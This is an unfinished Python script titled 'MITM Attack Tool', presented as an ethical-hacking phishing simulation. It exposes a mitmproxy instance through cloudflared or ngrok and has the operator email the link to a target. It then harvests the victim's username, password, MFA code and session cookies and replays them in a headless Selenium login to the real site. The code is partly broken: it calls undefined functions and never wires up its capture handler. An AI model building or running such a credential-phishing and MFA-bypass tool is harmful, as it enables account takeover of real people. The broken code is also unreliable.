######################################################################################################################################################################################################################
# Intial mitm proxy tool. python mitm_proxy_tool.py. !!!Under-Constuction!!!  
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#######################################################################################################################################################################################################################

import subprocess
import time
import logging
import sys
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC


def display_splash_screen():
    splash = """
    
   _____  .______________.___   _____        __________                                        _____   __    __                   __        ___________            .__                 _____  ____         .__       _____           _______  ____ 
  /     \ |   \__    ___/|   | /     \       \______   \_______  ____ ___  ___ ___.__.        /  _  \_/  |__/  |______     ____  |  | __    \__    ___/____   ____ |  |               /  |  |/_   |______  |  |__   /  |  |          \   _  \/_   |
 /  \ /  \|   | |    |   |   |/  \ /  \       |     ___/\_  __ \/  _ \\  \/  /<   |  |       /  /_\  \   __\   __\__  \  _/ ___\ |  |/ /      |    |  /  _ \ /  _ \|  |     ______   /   |  |_|   |\____ \ |  |  \ /   |  |_  ______ /  /_\  \|   |
/    Y    \   | |    |   |   /    Y    \      |    |     |  | \(  <_> )>    <  \___  |      /    |    \  |  |  |  / __ \_\  \___ |    <       |    | (  <_> |  <_> )  |__  /_____/  /    ^   /|   ||  |_> >|   Y  |    ^   / /_____/ \  \_/   \   |
\____|__  /___| |____|   |___\____|__  /______|____|     |__|   \____//__/\_ \ / ____|______\____|__  /__|  |__| (____  / \___  >|__|_ \______|____|  \____/ \____/|____/           \____   | |___||   __/ |___|  |____   |           \_____  /___|
        \/                           \//_____/                              \/ \/    /_____/        \/                \/      \/      \/_____/                                           |__|      |__|         \/     |__|                 \/     
 
                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/
                                 /\      {====}     )___(
                      (\=,      //\\      )__(     /_____\
      __    |'-'-'|  //  .\    (    )    /____\     |   |
     /  \   |_____| (( \_  \    )__(      |  |      |   |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |
    /____\   |   |  (/     \    |  |      |  |      |   |
     |  |    |   |   | _.-'|    |  |      |  |      |   |
     |__|    )___(    )___(    /____\    /____\    /_____\
    (====)  (=====)  (=====)  (======)  (======)  (=======)
    }===={  }====={  }====={  }======{  }======{  }======={
   (______)(_______)(_______)(________)(________)(_________)
   
 
"""

    print(splash)
    print("MITM Attack Tool 41PH4-01\n")

# Setup logging
logging.basicConfig(level=logging.INFO)
log = logging.getLogger("PhishingSimulation")

# Constants
MITMPROXY_PATH = "mitmproxy"  # Assuming mitmproxy is in the system's PATH for Linux
CAPTURED_DATA_PATH = "/path/to/store/captured_data"  # Path to store captured data
REAL_SITE_URL = "https://real-site.com/login"  # The real site URL for login

# Function to check if a tool is installed and install if necessary
def check_and_install_tool(tool_name, install_command):
    try:
        # Check if the tool is available in the system's PATH
        subprocess.run([tool_name, "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        print(f"{tool_name} is already installed.")
    except subprocess.CalledProcessError:
        # If tool is not found, attempt installation
        print(f"{tool_name} is not installed. Installing now...")
        try:
            subprocess.run(install_command, check=True, shell=True)
            print(f"{tool_name} has been successfully installed.")
        except subprocess.CalledProcessError as e:
            print(f"Failed to install {tool_name}. Please install it manually.")
            sys.exit(1)

# Optionally, prompt user for tool selection
def prompt_user_for_tool_selection():
    print("Select the tunnel tool you want to use:")
    print("1. Cloudflared")
    print("2. ngrok")
    print("3. Server.io")
    selection = input("Enter your selection (1/2/3): ")
    
    if selection == "1":
        return "cloudflared", "sudo apt install cloudflared"  # Example install command for cloudflared
    elif selection == "2":
        return "ngrok", "sudo apt install ngrok"  # Example install command for ngrok
    elif selection == "3":
        return "server.io", "npm install -g server"  # Example install command for server.io
    else:
        print("Invalid selection. Exiting...")
        sys.exit(1)

# Tunnel tool selection and installation
TUNNEL_TOOL, INSTALL_COMMAND = prompt_user_for_tool_selection()
check_and_install_tool(TUNNEL_TOOL, INSTALL_COMMAND)

# Function to start mitmproxy and capture traffic
def start_mitmproxy():
    log.info("Starting mitmproxy to capture traffic...")

    try:
        subprocess.run([MITMPROXY_PATH, "--listen-port", "8080"], check=True)
        log.info("mitmproxy is running and capturing traffic.")
    except subprocess.CalledProcessError:
        log.error("Failed to start mitmproxy.")
        sys.exit(1)

# Function to start Cloudflared, ngrok, or server.io tunnel
def start_tunnel():
    log.info(f"Starting {TUNNEL_TOOL} to expose mitmproxy...")

    if TUNNEL_TOOL == "cloudflared":
        tunnel_process = subprocess.Popen(["cloudflared", "tunnel", "--url", "http://localhost:8080"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    elif TUNNEL_TOOL == "ngrok":
        tunnel_process = subprocess.Popen(["ngrok", "http", "8080"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    elif TUNNEL_TOOL == "server.io":
        tunnel_process = subprocess.Popen(["server", "tunnel", "8080"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    else:
        log.error(f"Unsupported tunnel tool: {TUNNEL_TOOL}")
        sys.exit(1)

    # Capture the URL
    time.sleep(5)  # Allow time for the tunnel to be set up
    if TUNNEL_TOOL == "cloudflared":
        url = subprocess.getoutput("cloudflared tunnel --url http://localhost:8080")
    elif TUNNEL_TOOL == "ngrok":
        url = subprocess.getoutput("curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url'")
    elif TUNNEL_TOOL == "server.io":
        url = subprocess.getoutput("curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url'")

    log.info(f"Tunnel URL: {url}")
    
    # Pause and wait for the ethical hacker to confirm they are ready
    input("The phishing page is exposed at: " + url + "\nPress Enter to continue once you have prepared the email and sent the link to the target.")

    return url

# Function to capture credentials from mitmproxy traffic
captured_credentials = {}

def request(flow):
    # Capture username and password from form submissions
    if "username" in flow.request.fields and "password" in flow.request.fields:
        username = flow.request.fields["username"]
        password = flow.request.fields["password"]
        captured_credentials["username"] = username
        captured_credentials["password"] = password
        log.info(f"Captured credentials: {username}, {password}")

    # Optionally capture MFA if it exists
    if "mfa_code" in flow.request.fields:
        mfa_code = flow.request.fields["mfa_code"]
        captured_credentials["mfa_code"] = mfa_code
        log.info(f"Captured MFA code: {mfa_code}")

    # Capture session cookies
    if flow.response.cookies:
        captured_credentials["cookies"] = flow.response.cookies
        log.info("Captured cookies.")

# Main function to run the entire process
def run_phishing_simulation():
    # Start mitmproxy to capture traffic
    start_mitmproxy()

    # Start the tunneling tool (Cloudflared, ngrok, or server.io)
    url = start_tunnel()

    # Start browser automation with Selenium for the real login attempt
    log.info("Starting browser automation for the attacker machine...")
    options = Options()
    options.add_argument("--headless")  # Run in headless mode
    options.add_argument(f'--proxy-server=http://localhost:8080')  # Use mitmproxy as the proxy

    # Launch Selenium WebDriver with Chrome
    driver = webdriver.Chrome(options=options)

    # Wait for traffic to be captured
    log.info("Waiting for user credentials to be captured...")
    time.sleep(5)

    # Capture the credentials
    username = captured_credentials.get("username")
    password = captured_credentials.get("password")
    mfa_code = captured_credentials.get("mfa_code")
    cookies = captured_credentials.get("cookies")

    # Perform login on the real website
    if username and password:
        login_to_real_website(driver, username, password, mfa_code, cookies)
        capture_screenshot(driver)

    # Logout from the real website (for the ethical hacker)
    logout_of_real_website(driver)

    # Redirect the user to the real login page immediately after traffic capture
    redirect_user_to_real_site()

    # Close the browser
    driver.quit()

if __name__ == "__main__":
    run_phishing_simulation()
